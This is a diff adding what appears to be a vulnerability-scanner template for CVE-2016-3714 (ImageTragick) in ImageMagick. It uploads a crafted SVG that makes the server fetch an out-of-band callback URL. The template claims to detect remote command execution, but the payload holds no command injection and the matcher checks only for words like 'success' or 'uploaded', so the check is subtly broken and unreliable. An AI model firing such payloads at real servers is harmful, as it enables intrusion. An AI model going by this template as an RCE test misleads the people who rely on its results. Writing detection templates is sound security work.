@@ -1,0 +1,52 @@
+[info]
+author = "AVE"
+description = "检测 ImageMagick 在处理恶意构造的 SVG/MSL 图片文件时，是否通过 delegate 机制执行任意系统命令（ImageTragick 漏洞）"
+id = "POC-AVE-2016-0309"
+name = "CVE-2016-3714 ImageMagick ImageTragick Remote Code Execution PoC"
+severity = "critical"
+tags = [
+    "cve-2016-3714",
+    "imagemagick",
+    "rce",
+    "imagetragick",
+]
+vuln_id = [
+    "CVE-2016-3714",
+    "AVE-2016-0309",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/upload"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+------WebKitFormBoundary\r
+Content-Disposition: form-data; name="file"; filename="test.svg"\r
+Content-Type: image/svg+xml\r
+\r
+<?xml version="1.0"?>\r
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\r
+<svg xmlns="http://www.w3.org/2000/svg">\r
+  <image xlink:href="https://{{interactsh-url}}/test" />\r
+</svg>\r
+------WebKitFormBoundary--\r
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----WebKitFormBoundary"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "success",
+    "uploaded",
+    "processed",
+]
